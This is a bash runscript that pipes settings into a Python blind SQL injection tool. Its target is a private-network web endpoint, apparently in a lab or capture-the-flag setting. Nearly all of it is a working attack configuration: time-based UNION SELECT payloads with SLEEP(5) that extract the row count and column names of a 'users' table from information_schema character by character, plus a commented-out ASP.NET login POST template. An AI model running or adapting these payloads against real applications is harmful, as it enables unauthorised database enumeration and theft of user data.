#!/bin/bash

# runscript for blind-sqli.py
# please mind the quotes in these variables, whereas a single quote is needed for string containing double quotes
# double quotes is needed for string containing single quotes, BUT remember to escape the special $'s so they dont get treated in vairalbes containing NULL

ip="http://192.168.180.127:33033/slug?URL="
attack_type="T"
seconds="5"

# row counting query to iterate, remember the placeholders:
#	$c is to be replaced by ASCII values of characters
# 	$p is to be replaced by the string position value
row_count_payload="' UNION SELECT IF( ASCII(SUBSTRING((SELECT COUNT(column_name) from information_schema.columns where table_name = 'users'), \$p, 1)) = \$c , SLEEP(5), 1); --\t"

# NOTE the following three variables will only be needed if the request_type is POST, GET does not require, a new runscript will be needed
request_type="GET"
# post dictionary for requests object, remember to NOT include vuln param, that is entered later when it is been fuzzed by character values
#post_dict='{"__VIEWSTATE" : "/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=","__VIEWSTATEGENERATOR":"CA0B0334","__EVENTVALIDATION":"/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=", "ctl00$ContentPlaceHolder1$PasswordTextBox": "","ctl00$ContentPlaceHolder1$LoginButton":"Enter"}'
#vuln_param='ctl00$ContentPlaceHolder1$UsernameTextBox'

# final query to iterate, remember the placeholders:
#	$c is to be replaced by ASCII values of characters
# 	$p is to be replaced by the string position value
# 	$r is to be replaced by the row position value
query_payload="' UNION SELECT IF( ASCII(SUBSTRING((SELECT column_name from information_schema.columns where table_name = 'users' order by column_name ASC LIMIT \$r, 1), \$p, 1)) = \$c , SLEEP(5), 1); --\t"

echo -e "\nInputting the following:"
echo -e "IP: $ip"
echo -e "Attack Type: $attack_type"
echo -e "Seconds: $seconds"
echo -e "Row Counting Payload: $row_count_payload"
echo -e "Request Type: $request_type"
echo -e "Query Payload: $query_payload"

{

sleep 1;
echo -e $ip
sleep 1;
echo -e $attack_type 
sleep 1;
echo -e $seconds
sleep 1;
echo -e $row_count_payload
sleep 1;
echo -e $request_type
sleep 1;
#echo $post_dict
#sleep 1;
#echo $vuln_param

#sleep 1;
echo -e $query_payload; 

} | python3 blind-sqli-revised.py
